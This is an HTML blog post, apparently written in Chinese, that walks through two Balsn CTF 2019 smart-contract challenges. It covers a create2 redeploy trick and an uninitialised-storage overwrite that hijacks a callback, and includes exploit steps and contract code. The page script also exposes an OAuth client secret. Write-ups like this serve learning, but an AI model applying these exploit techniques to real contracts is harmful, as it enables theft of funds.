@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/06/icse-2020-taser/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/06/balsn-ctf-2019-smartcontract/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Balsn Ctf 2019 Smartcontract | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="Balsn Ctf 2019 Smartcontract | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "Balsn Ctf 2019 Smartcontract",
+    "headline" : "Balsn Ctf 2019 Smartcontract",
+    "description" : "前言 balsn ctf 2019 的两道 smart contract 的题目，相关题目 repo：https:\/\/github.com\/x9453\/balsn-ctf-2019 2020 年了，还在复现",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-06-25 22:59:52 \x2b0800 CST",
+    "dateModified" : "2020-06-25 22:59:52 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/06\/balsn-ctf-2019-smartcontract\/",
+    "wordCount" : "2250",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Balsn Ctf 2019 Smartcontract</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-06-25 itemprop="datePublished">June 25, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/smartcontract/"> SmartContract </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h2 id="前言">前言</h2>
+<p>balsn ctf 2019 的两道 smart contract 的题目，相关题目 repo：https://github.com/x9453/balsn-ctf-2019</p>
+<p>2020 年了，还在复现 2019 年的题目，太菜了(T＿T)</p>
+<h2 id="creativity">Creativity</h2>
+<p>题目源码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">10</span>;
+
+<span style="color:#66d9ef">contract</span> Creativity {
+    <span style="color:#66d9ef">event</span> SendFlag(<span style="color:#66d9ef">address</span> addr);
+    
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> target;
+    <span style="color:#66d9ef">uint</span> randomNumber <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    
+    <span style="color:#66d9ef">function</span> check(<span style="color:#66d9ef">address</span> _addr) <span style="color:#66d9ef">public</span> {
+        <span style="color:#66d9ef">uint</span> size;
+        <span style="color:#66d9ef">assembly</span> { size <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(_addr) }
+        require(size <span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> size <span style="color:#960050;background-color:#1e0010">&lt;=</span> <span style="color:#ae81ff">4</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+        target <span style="color:#960050;background-color:#1e0010">=</span> _addr<span style="color:#960050;background-color:#1e0010">;</span>
+    }
+    
+    <span style="color:#66d9ef">function</span> execute() <span style="color:#66d9ef">public</span> {
+        require(target <span style="color:#f92672">!=</span> <span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>));
+        target.delegatecall(abi.encodeWithSignature(<span style="color:#e6db74">&#34;&#34;</span>));
+        selfdestruct(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>));
+    }
+    
+    <span style="color:#66d9ef">function</span> sendFlag() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        require(msg.value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100000000</span> <span style="color:#66d9ef">ether</span>);
+        emit SendFlag(msg.sender);
+    }
+}
+</code></pre></div><p>用于复现的合约地址 <a href="https://ropsten.etherscan.io/address/0x38493CC64406DDcCC9Df7B28D8eFA4DcCCB0345F">ropsten@0x38493CC64406DDcCC9Df7B28D8eFA4DcCCB0345F</a></p>
+<h3 id="题目分析">题目分析</h3>
+<p>本题的核心目的是触发 <code>SendFlag</code>，但很明显 <code>sendFlag()</code> 函数是无法正常调用的，因为 <code>msg.value &gt;= 100000000 ether</code> 这个条件几乎无法满足，所以只能采用另一种思路，利用 <code>delegatecall</code> 的上下文特性来触发 <code>SendFlag</code> 事件。</p>
+<p>此时需要满足的条件是：</p>
+<ol>
+<li>部署一个合约，合约代码大小不超过4字节</li>
+<li>通过调用 <code>check()</code> 函数，将 <code>target</code> 赋值为我们的合约地址</li>
+<li>调用 <code>execute</code> 函数，通过对我们的合约调用 <code>degelatecall</code> 进而触发 <code>SendFlag</code></li>
+</ol>
+<p>本题的考点是 <code>create2</code> 的 <a href="https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614">trick</a>，简单来说就是 <code>create2</code>  和 <code>create</code> 计算合约地址的不同，这使得可以利用 <code>create2</code> 在同一个地址上先后部署不同的合约。</p>
+<p>这是出题人给的 PoC，通过 <code>deploy</code> 可以将不同合约代码部署到同一个地址上：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">10</span>;
+
+<span style="color:#66d9ef">contract</span> Deployer {
+    <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">public</span> deployBytecode;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> deployedAddr;
+    
+    <span style="color:#66d9ef">function</span> deploy(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code) <span style="color:#66d9ef">public</span> {
+        deployBytecode <span style="color:#f92672">=</span> code;
+        <span style="color:#66d9ef">address</span> a;
+        <span style="color:#75715e">// Compile Dumper to get this bytecode
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> dumperBytecode <span style="color:#f92672">=</span> <span style="color:#e6db74">hex&#39;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#39;</span>;
+        <span style="color:#66d9ef">assembly</span> {
+            a <span style="color:#f92672">:=</span> create2(<span style="color:#a6e22e">callvalue</span>, <span style="color:#a6e22e">add</span>(<span style="color:#ae81ff">0x20</span>, dumperBytecode), <span style="color:#a6e22e">mload</span>(dumperBytecode), <span style="color:#ae81ff">0x9453</span>)
+        }
+        deployedAddr <span style="color:#960050;background-color:#1e0010">=</span> a<span style="color:#960050;background-color:#1e0010">;</span>
+    }
+}
+
+<span style="color:#66d9ef">contract</span> Dumper {
+    constructor() <span style="color:#66d9ef">public</span> {
+        Deployer dp <span style="color:#f92672">=</span> Deployer(msg.sender);
+        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> bytecode <span style="color:#f92672">=</span> dp.deployBytecode();
+        <span style="color:#66d9ef">assembly</span> {
+            <span style="color:#a6e22e">return</span> (<span style="color:#a6e22e">add</span>(bytecode, <span style="color:#ae81ff">0x20</span>), <span style="color:#a6e22e">mload</span>(bytecode))
+        }
+    }
+}
+</code></pre></div><p>那么剩下的步骤就相对简单了：</p>
+<ol>
+<li>
+<p><code>deploy(0x33ff)</code>，部署合约为 <code>selfdestruct(msg.sender)</code>，合约地址为 0x90B5B5df0d133be8c6420B1d8896C214D59bA9EB</p>
+</li>
+<li>
+<p>调用 <code>check()</code> 使其通过合约大小 4 字节的校验</p>
+</li>
+<li>
+<p>发送交易，触发合约自毁 <code>web3.eth.sendTransaction({to: &quot;0x90B5B5df0d133be8c6420B1d8896C214D59bA9EB&quot;, data: &quot;&quot; }, function(err,res){console.log(res)});</code></p>
+<p><img src="/images/posts/balsn-ctf-2019-smartcontract/Creativity01.png" alt="Contract v1"></p>
+</li>
+<li>
+<p><code>deploy(0x6080604052348015600f57600080fd5b507f2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a57932604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a13273ffffffffffffffffffffffffffffffffffffffff16fffea265627a7a7230582076ed0548fcb15acaeee3e64c098e0253cb7cf70c7fd668366820c47db0467a5b64736f6c634300050a0032)</code>，对应的合约代码为：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> Solve {
+    <span style="color:#66d9ef">event</span> SendFlag(<span style="color:#66d9ef">address</span> addr);
+       
+    <span style="color:#66d9ef">function</span>() <span style="color:#66d9ef">external</span> {
+        emit SendFlag(tx.origin);
+        selfdestruct(tx.origin);
+    }
+}
+</code></pre></div><p>此时新的合约代码已经被部署到相同的地址上了:</p>
+<p><img src="/images/posts/balsn-ctf-2019-smartcontract/Creativity02.png" alt="Contract v2"></p>
+</li>
+<li>
+<p>调用 <code>execute()</code>，成功触发 <code>SendFlag</code> 事件:</p>
+<p><img src="/images/posts/balsn-ctf-2019-smartcontract/Creativity03.png" alt="SendFlag"></p>
+</li>
+</ol>
+<h2 id="bank">Bank</h2>
+<p>题目源码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">4</span>.<span style="color:#ae81ff">24</span>;
+
+<span style="color:#66d9ef">contract</span> Bank {
+    <span style="color:#66d9ef">event</span> SendEther(<span style="color:#66d9ef">address</span> addr);
+    <span style="color:#66d9ef">event</span> SendFlag(<span style="color:#66d9ef">address</span> addr);
+    
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+    <span style="color:#66d9ef">uint</span> randomNumber <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    
+    constructor() <span style="color:#66d9ef">public</span> {
+        owner <span style="color:#f92672">=</span> msg.sender;
+    }
+    
+    <span style="color:#66d9ef">struct</span> SafeBox {
+        <span style="color:#66d9ef">bool</span> done;
+        <span style="color:#66d9ef">function</span>(<span style="color:#66d9ef">uint</span>, <span style="color:#66d9ef">bytes12</span>) <span style="color:#66d9ef">internal</span> callback;
+        <span style="color:#66d9ef">bytes12</span> hash;
+        <span style="color:#66d9ef">uint</span> value;
+    }
+    SafeBox[] safeboxes;
+    
+    <span style="color:#66d9ef">struct</span> FailedAttempt {
+        <span style="color:#66d9ef">uint</span> idx;
+        <span style="color:#66d9ef">uint</span> time;
+        <span style="color:#66d9ef">bytes12</span> triedPass;
+        <span style="color:#66d9ef">address</span> origin;
+    }
+    <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> FailedAttempt[]) failedLogs;
+    
+    <span style="color:#66d9ef">modifier</span> onlyPass(<span style="color:#66d9ef">uint</span> idx, <span style="color:#66d9ef">bytes12</span> pass) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">bytes12</span>(<span style="color:#a6e22e">sha3</span>(pass)) <span style="color:#f92672">!=</span> safeboxes[idx].hash) {
+            FailedAttempt info;
+            info.idx <span style="color:#f92672">=</span> idx;
+            info.time <span style="color:#f92672">=</span> now;
+            info.triedPass <span style="color:#f92672">=</span> pass;
+            info.origin <span style="color:#f92672">=</span> tx.origin;
+            failedLogs[msg.sender].push(info);
+        }
+        <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">_</span>;
+        }
+    }
+    
+    <span style="color:#66d9ef">function</span> deposit(<span style="color:#66d9ef">bytes12</span> hash) <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">uint</span>) {
+        SafeBox box;
+        box.done <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+        box.hash <span style="color:#f92672">=</span> hash;
+        box.value <span style="color:#f92672">=</span> msg.value;
+        <span style="color:#66d9ef">if</span> (msg.sender <span style="color:#f92672">==</span> owner) {
+            box.callback <span style="color:#f92672">=</span> sendFlag;
+        }
+        <span style="color:#66d9ef">else</span> {
+            require(msg.value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
+            box.value <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">01</span> <span style="color:#66d9ef">ether</span>;
+            box.callback <span style="color:#f92672">=</span> sendEther;
+        }
+        safeboxes.push(box);
+        <span style="color:#66d9ef">return</span> safeboxes.length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    
+    <span style="color:#66d9ef">function</span> withdraw(<span style="color:#66d9ef">uint</span> idx, <span style="color:#66d9ef">bytes12</span> pass) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        SafeBox box <span style="color:#f92672">=</span> safeboxes[idx];
+        require(<span style="color:#f92672">!</span>box.done);
+        box.callback(idx, pass);
+        box.done <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+    }
+    
+    <span style="color:#66d9ef">function</span> sendEther(<span style="color:#66d9ef">uint</span> idx, <span style="color:#66d9ef">bytes12</span> pass) <span style="color:#66d9ef">internal</span> onlyPass(idx, pass) {
+        msg.sender.transfer(safeboxes[idx].value);
+        emit SendEther(msg.sender);
+    }
+    
+    <span style="color:#66d9ef">function</span> sendFlag(<span style="color:#66d9ef">uint</span> idx, <span style="color:#66d9ef">bytes12</span> pass) <span style="color:#66d9ef">internal</span> onlyPass(idx, pass) {
+        require(msg.value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100000000</span> <span style="color:#66d9ef">ether</span>);
+        emit SendFlag(msg.sender);
+        selfdestruct(owner);
+    }
+
+}
+</code></pre></div><p>用于复现的合约：<a href="https://ropsten.etherscan.io/address/0xc6fef6a5c43e661fafdfa8a68983c4000d86d86d">ropsten@0xc6fef6a5c43e661fafdfa8a68983c4000d86d86d</a></p>
+<h3 id="evm-变量存储规则">EVM 变量存储规则</h3>
+<p>以下面这段合约为例：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> C {
+    <span style="color:#66d9ef">address</span> a;
+    <span style="color:#66d9ef">uint</span> r;
+    <span style="color:#66d9ef">uint</span>[] b;
+    <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">uint</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) m;
+    
+    constructor() <span style="color:#66d9ef">public</span> {
+        a <span style="color:#f92672">=</span> msg.sender;
+        r <span style="color:#f92672">=</span> <span style="color:#ae81ff">777</span>;
+        b.push(<span style="color:#ae81ff">333</span>);
+        b.push(<span style="color:#ae81ff">444</span>);
+        m[<span style="color:#ae81ff">999</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">888</span>;
+    }
+}
+</code></pre></div><p>数组 b 的第一个元素位置在 <code>keccak256(2)</code>，即 <code>slot[keccak256(2)+0]</code> 存储 333， <code>slot[keccak256(2)+1]</code> 存储 444；而映射 m[k] 存储在 <code>slot[keccak256(k.3)]</code>，即 <code>slot[keccak256(999.3)]</code> 存储的是 888。</p>
+<p>可以利用以下函数来分别获取 <code>slot</code> 上存储的内容，<code>mapping</code> 内容对应 <code>slot</code> 、数组第一个元素对应的 <code>slot</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">function</span> read_slot(<span style="color:#66d9ef">uint</span> k) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bytes32</span> res) {
+    <span style="color:#66d9ef">assembly</span> { res <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sload</span>(k) }
+}
+
+<span style="color:#66d9ef">function</span> cal_addr(<span style="color:#66d9ef">uint</span> k, <span style="color:#66d9ef">uint</span> p) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">bytes32</span> res) {
+    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(abi.encodePacked(k, p));
+}
+
+<span style="color:#66d9ef">function</span> cal_addr(<span style="color:#66d9ef">uint</span> p) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">bytes32</span> res) {
+    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(abi.encodePacked(p));
+}
+</code></pre></div><h3 id="题目分析-1">题目分析</h3>
+<p>本题考点在于未初始化变量漏洞，以及数组、映射在 EVM 中的存储方式，以及如何控制程序执行流。</p>
+<p>首先这是合约的变量存储布局：</p>
+<pre><code>-----------------------------------------------------
+|     unused (12)     |          owner (20)         | &lt;- slot 0
+-----------------------------------------------------
+|                 randomNumber (32)                 | &lt;- slot 1
+-----------------------------------------------------
+|               safeboxes.length (32)               | &lt;- slot 2
+-----------------------------------------------------
+|       occupied by failedLogs but unused (32)      | &lt;- slot 3
+-----------------------------------------------------
+</code></pre><p>这是 <code>FailedAttempt</code> 结构的存储布局：</p>
+<pre><code>-----------------------------------------------------
+|                      idx (32)                     |
+-----------------------------------------------------
+|                     time (32)                     |
+-----------------------------------------------------
+|          origin (20)         |   triedPass (12)   |
+-----------------------------------------------------
+</code></pre><p>这是 <code>SafeBox</code> 结构的存储布局：</p>
+<pre><code>-----------------------------------------------------
+| unused (15) | hash (12) | callback (4) | done (1) |
+-----------------------------------------------------
+|                     value (32)                    |
+-----------------------------------------------------
+</code></pre><p>可以看到即使是利用了 <code>deposit(0)</code> 中的未初始化漏洞来修改 <code>owner</code>，也会被 <code>sendFlag</code> 函数的 <code>require(msg.value &gt;= 100000000 ether)</code> 条件限制，所以这里不能直接直接调用，那么另一种的调用思路就是利用未初始化变量来劫持控制流进而直接触发 <code>SendFlag</code> 事件。</p>
+<p>这里再介绍一下 EVM 是如何执行函数的，在 EVM 中所有的合约内部函数执行都表示为一个 <code>JUMP</code> 指令，而且跳转只能跳转以 <code>JUMPDEST</code> 开始的地方，查看 <code>sendFlag()</code> 对应的字节码：</p>
+<p><img src="/images/posts/balsn-ctf-2019-smartcontract/bytecode.png" alt="bytecode"></p>
+<p>可以看到 <code>06F5</code> 是函数的入口，再下面的 <code>070F</code> 则是 <code>emit SendFlag()</code> 调用的入口，因此如果能劫持相应的控制流使其直接跳转到这里，就能成功触发 <code>SendFlag()</code> 事件。</p>
+<p>因此解题的思路如下：</p>
+<ol>
+<li>利用 <code>tx.origin</code> 和 <code>triedPass</code> 覆盖 slot 2，即  <code>safeboxes</code> 的长度。如果 <code>tx.origin</code> 足够大，此时 <code>safeboxes</code> 的长度可以覆盖 <code>failedLogs</code></li>
+<li>当 <code>safeboxes</code> 的长度可以覆盖 <code>failedLogs</code> 时，利用 <code>triedPass</code> 来覆盖 <code>callback</code> 进而控制程序的执行流</li>
+<li>将 <code>callback</code> 修改为 <code>0000070f</code>，然后利用 <code>withdraw()</code> 触发 <code>callback</code> 函数的执行，即可顺利获得 flag</li>
+</ol>
+<p>详细的 exp 不再赘述，这里贴一下作者的 wp 以及我在过程中用于计算的代码：</p>
+<blockquote>
+<ol>
+<li>Calculate <code>target = keccak256(keccak256(msg.sender||3)) + 2</code>.</li>
+<li>Calculate <code>base = keccak256(2)</code>.</li>
+<li>Calculate <code>idx = (target - base) // 2</code>.</li>
+<li>If <code>(target - base) % 2 == 1</code>, then <code>idx += 2</code>, and do step 6 and 7 twice. The two chosen indices in step 7 should be 0 and 1 respectively. This happens when the <code>triedPass</code> of the first element of <code>failedLogs</code> does not overlap with the <code>callback</code> variable, so we choose the second element instead.</li>
+<li>If <code>(msg.sender &lt;&lt; (12*8)) &lt; idx</code>, then choose another player account, and restart from step 1. This happens when the overwritten length of <code>safeboxes</code> is not large enough to overlap with <code>failedLogs</code>.</li>
+<li>Call <code>deposit(0x000000000000000000000000)</code> with 1 ether.</li>
+<li>Call <code>withdraw(0, 0x111111111111110000070f00)</code>.</li>
+<li>Call <code>withdraw(idx, 0x000000000000000000000000)</code>, and the <code>SendFlag</code> event will be emitted.</li>
+</ol>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">4</span>.<span style="color:#ae81ff">24</span>;
+
+<span style="color:#66d9ef">contract</span> Solve {
+    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">public</span> tmp;
+    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">public</span> target;
+    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">public</span> base;
+    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">public</span> index;
+    
+    constructor(<span style="color:#66d9ef">address</span> _addr) <span style="color:#66d9ef">public</span> {
+        tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(<span style="color:#66d9ef">uint</span>(_addr), <span style="color:#66d9ef">uint</span>(<span style="color:#ae81ff">3</span>));
+        target <span style="color:#f92672">=</span> <span style="color:#66d9ef">bytes32</span>(<span style="color:#66d9ef">uint</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#66d9ef">uint</span>(tmp))) <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+        base <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(abi.encodePacked(<span style="color:#66d9ef">uint</span>(<span style="color:#ae81ff">0x2</span>)));
+        index <span style="color:#f92672">=</span> <span style="color:#66d9ef">bytes32</span>((<span style="color:#66d9ef">uint</span>(target) <span style="color:#f92672">-</span> <span style="color:#66d9ef">uint</span>(base)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>); 
+    }
+}
+</code></pre></div><p>调用成功后，成功触发 <code>SendFlag</code>：</p>
+<p><img src="/images/posts/balsn-ctf-2019-smartcontract/Bank-SendFlag.png" alt="SendFlag"></p>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li>
+<p><a href="https://x9453.github.io/2020/01/16/Balsn-CTF-2019-Bank/">Balsn CTF 2019 - Bank</a></p>
+</li>
+<li>
+<p><a href="https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/">Balsn CTF 2019 - Creativity</a></p>
+</li>
+<li>
+<p><a href="https://hitcxy.com/2020/balsn2019-bank/">pikachu&rsquo;s Blog - Balsn CTF 2019 - Bank</a></p>
+</li>
+<li>
+<p><a href="https://hitcxy.com/2020/balsn2019-create2/">pikachu&rsquo;s Blog - Balsn CTF 2019 - Creativity</a></p>
+</li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/06/balsn-ctf-2019-smartcontract/>https://syang-ng.github.io/2020/06/balsn-ctf-2019-smartcontract/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/06/icse-2020-taser/" class="prev" rel="prev" title="ICSE 2020 Taser"><i class="iconfont icon-left"></i>&nbsp;ICSE 2020 Taser</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
